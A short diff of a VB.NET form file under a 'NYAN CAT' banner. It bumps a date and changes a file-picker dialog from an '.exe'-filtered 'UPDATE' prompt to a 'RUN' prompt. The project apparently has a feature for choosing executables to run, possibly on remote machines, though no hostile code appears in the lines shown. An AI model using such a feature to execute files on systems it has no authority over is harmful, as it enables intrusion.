@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./16/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./17/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -475,8 +475,7 @@ Public Class Form1
         Try
             Dim o As New OpenFileDialog
             With o
-                .Filter = ".exe (*.exe)|*.exe"
-                .Title = "UPDATE"
+                .Title = "RUN"
             End With
 
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
